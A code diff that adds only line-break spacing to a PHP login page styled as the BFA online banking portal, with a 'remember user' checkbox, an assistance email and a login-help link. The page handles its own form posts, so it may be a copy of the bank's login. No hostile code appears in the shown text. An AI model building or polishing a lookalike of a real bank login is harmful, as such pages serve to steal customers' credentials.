@@ -152,6 +152,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
           <input id="recordar" type="checkbox" checked="" style="width:16px;height:16px;accent-color:#022a4f">
           <label for="recordar" style="display:inline;font-weight:600;margin:0">Recordar Usuario</label>
         </div>
+        <br>
       </form>
 
       </div><!-- /step-1 -->
@@ -189,11 +190,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <div style="font-weight:700;color:#022a4f;margin-bottom:4px">Para asistencia</div>
         <a href="mailto:info.bfaonline@bfa.gob.sv" style="font-weight:700;text-decoration:underline;color:#022a4f">info.bfaonline@bfa.gob.sv</a>
       </div>
+<br>
 
       <div class="recover" style="text-align:center;margin-top:22px;font-size:14px;font-weight:700">
         <a href="#" style="text-decoration:underline">¿No puedes iniciar sesión?</a>
       </div>
-
+<br>
+<br><br><br>
       <div class="contact" style="margin-top:30px;display:flex;align-items:center;justify-content:center;gap:18px;flex-wrap:wrap">
         <div class="socials" style="display:flex;flex-direction:column;align-items:center;gap:6px">
           <div class="icons" style="display:flex;gap:10px;align-items:center">
